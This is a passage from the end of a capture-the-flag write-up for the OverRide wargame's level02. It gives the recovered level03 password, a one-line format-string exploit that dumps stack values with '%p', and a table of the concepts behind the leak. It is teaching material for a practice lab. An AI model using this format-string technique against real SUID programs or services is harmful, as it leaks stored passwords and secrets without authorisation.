## Step 9: Use the password

```
level02@OverRide:~$ su level03
Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
level03@OverRide:~$
```

---

## Final exploit command

```bash
( python -c "import sys; sys.stdout.write('%p.'*30+'\n'+'wrong\n')" ) | ./level02
```

Then decode positions 22–26 from the output as described above.

---

## Key concepts

| Concept | Role in the exploit |
|---|---|
| **Format string vulnerability** | `printf(username)` lets us read stack memory using `%p` specifiers |
| **x86-64 calling convention** | First 5 args in registers, rest on stack — determines the offset to reach `file_pass` |
| **Little-endian byte order** | 8-byte hex values must be reversed byte-by-byte to recover the ASCII password |
| **Stack data leakage** | The password from `.pass` is loaded on the stack by `fread` before `printf` is called |
| **SUID binary** | The program runs as `level03`, which is why it can read `/home/users/level03/.pass` |
